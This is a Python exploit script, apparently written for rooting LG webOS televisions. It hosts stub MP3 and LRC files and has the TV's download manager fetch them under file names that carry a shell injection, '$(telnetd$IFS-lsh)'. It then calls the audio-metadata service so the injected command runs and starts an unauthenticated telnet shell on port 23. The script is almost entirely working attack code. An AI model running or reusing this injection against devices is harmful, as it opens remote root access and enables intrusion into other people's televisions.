from bscpylgtv import WebOsClient
from aiohttp import web
import asyncio
import socket
import time


# Determine LAN IP using the source IP field of an outgoing connection
def get_lan_ip():
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Use Google's public DNS server to determine the LAN IP
        s.connect(("8.8.8.8", 80))
        # Get the socket's own address
        ip = s.getsockname()[0]
        # Close the socket
        s.close()
        print(f"Using {ip} as LAN IP")
        return ip
    except Exception as e:
        print(f"Error: {e}")
        return None


STOP_SERVER = False
HOST_IP = input("Enter your LAN IP address, or press ENTER to autodetect: ") or get_lan_ip()
TV_IP = input("Enter the TV's IP address: ")


def check_telnet():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)  # Timeout period in seconds
    end_time = time.time() + 15
    while time.time() < end_time:
        try:
            if sock.connect_ex((TV_IP, 23)) == 0:
                return True
        except socket.error:
            pass
        time.sleep(1)  # Wait for 1 second before checking again
    return False


async def handle(request):
    print("Served 404 response")
    return web.Response(text="OK")


async def audio_mp3_handler(request):
    # Create an empty bytes object for the mp3 file content
    print("Served mp3 payload")
    mp3_content = b""
    return web.Response(body=mp3_content, content_type="audio/mpeg")


async def audio_lrc_handler(request):
    # Create a valid UTF1632 LRC file
    print("Served lrc payload")
    lrc_content = bytes.fromhex("FFFE0000")
    return web.Response(body=lrc_content, content_type="application/octet-stream")


async def main():
    print("Connecting, make sure to allow the connection using the TV remote")
    client = await WebOsClient.create(TV_IP)
    try:
        await client.connect()
    except TimeoutError:
        print("Connection timed out, retrying...")
        await client.connect()
    finally:
        print("Connected to the TV, asking it to download our files...")

    await client.luna_request(
        "com.webos.service.downloadmanager/download",
        {
            "target": f"http://{HOST_IP}:8089/myaud_$(telnetd$IFS-lsh).mp3",
            "targetDir": "/mnt/lg/appstore/internal/downloads/",
            "targetFilename": "myaud_$(telnetd$IFS-lsh).mp3",
        },
    )

    await client.luna_request(
        "com.webos.service.downloadmanager/download",
        {
            "target": f"http://{HOST_IP}:8089/myaud_$(telnetd$IFS-lsh).lrc",
            "targetDir": "/mnt/lg/appstore/internal/downloads/",
            "targetFilename": "myaud_$(telnetd$IFS-lsh).lrc",
        },
    )

    print("Attempting to start telnetd...")

    await client.luna_request(
        "com.webos.service.attachedstoragemanager/getAudioMetadata",
        {
            "deviceId": "0bcef",
            "fullPath": "/mnt/lg/appstore/internal/downloads/myaud_$(telnetd$IFS-lsh).mp3",
        },
    )

    await asyncio.sleep(1)
    await client.disconnect()

    global STOP_SERVER
    STOP_SERVER = True

    print("Exploit message sent, checking if Telnet is up...")
    print()
    if check_telnet():
        print(f"Telnet is up! Connect to it using IP {TV_IP} and port 23.")
        print()
        print(
            "To install the Homebrew channel, follow the instructions here: https://github.com/webosbrew/webos-homebrew-channel?tab=readme-ov-file#installation"
        )
    else:
        print("Error: telnet server timed out after 15s. Your webOS version may be incompatible, your LAN IP may be wrong, or your firewall is blocking the connection.")


async def init_app():
    app = web.Application()
    app.router.add_get("/", handle)
    app.router.add_get("/myaud_$(telnetd$IFS-lsh).mp3", audio_mp3_handler)
    app.router.add_get("/myaud_$(telnetd$IFS-lsh).lrc", audio_lrc_handler)
    return app


async def start_server():
    app = await init_app()
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", 8089)
    await site.start()
    print("Server has started.")
    asyncio.create_task(main())


async def main_wrapper():
    await start_server()
    while not STOP_SERVER:
        await asyncio.sleep(1)


if __name__ == "__main__":
    asyncio.run(main_wrapper())
